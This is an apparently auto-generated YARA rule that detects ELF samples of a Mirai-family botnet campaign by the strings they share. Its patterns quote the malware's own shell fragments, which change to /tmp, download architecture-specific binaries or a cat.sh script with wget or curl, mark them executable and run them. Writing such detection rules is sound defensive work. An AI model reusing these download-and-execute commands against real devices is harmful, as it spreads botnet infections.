rule Sightlines_c2_784582ca_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-784582ca"
        date = "2026-11-07"
        campaign = "c2-784582ca"
        family = "mirai"
        hash = "21afce09a9aec231210cdf338177e4fa14dbe8671d238bf8a0619e7270da7282"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-784582ca.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii
        $s1 = "orf; cd /tmp; /bin/busybox wget http://%s/mipsel; chmod 777 mipsel; ./mipsel realtek; wget http://%s" ascii
        $s2 = " /tmp; wget http://%s/mipsel; chmod 777 mipsel; ./mipsel netis.netcore; wget http://%s/armv4l; chmod" ascii
        $s3 = "cd /tmp || cd /dev wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " ascii
        $s4 = "/armv4l; chmod 777 armv4l; ./armv4l realtek; " ascii
        $s5 = " 777 armv4l; ./armv4l netis.netcore; " ascii
        $s6 = "/usr/sbin/NetworkManager" ascii
        $s7 = "CwT01MAGqrgYRStHcV0X" ascii
        $s8 = "a7pInUoLgx1CPFlGB5JF" ascii
        $s9 = "tg57YSAcuvy2hdBlEWMv" ascii
        $s10 = "w70uUC1UJYZoPENznHXB" ascii
        $s11 = "yQAkUvZFjxExI3WbDp2g" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}
